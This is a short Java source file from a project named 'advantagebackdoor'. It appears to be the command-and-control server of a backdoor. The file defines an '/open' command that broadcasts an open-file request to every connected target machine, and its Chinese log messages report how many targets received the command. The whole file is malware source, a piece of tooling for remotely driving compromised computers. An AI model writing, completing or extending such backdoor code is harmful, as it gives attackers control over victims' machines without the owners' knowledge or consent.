package me.faintcloudy.advantagebackdoor.server.command;

import me.faintcloudy.advantagebackdoor.server.Log4jServer;
import me.faintcloudy.advantagebackdoor.api.connection.UserConnection;
import me.faintcloudy.advantagebackdoor.api.message.play.server.OpenFileMessage;

public class OpenFileCommand extends BranchedCommand {
    public OpenFileCommand() {
        super("/open", "向目标主机发送打开文件的请求");
    }

    @Override
    public void execute(String[] args) {
        if (args.length < 2)
        {
            Log4jServer.getInstance().getLogger().info("正确用法: /open <filename>");
            return;
        }

        OpenFileMessage message = new OpenFileMessage(args[1]);
        for (UserConnection target : Log4jServer.getInstance().getTargets()) {
            target.sendMessage(message);
        }

        Log4jServer.getInstance().getLogger().info("已向 " + Log4jServer.getInstance().getTargets().size() + " 个目标发送了打开文件请求");
    }
}
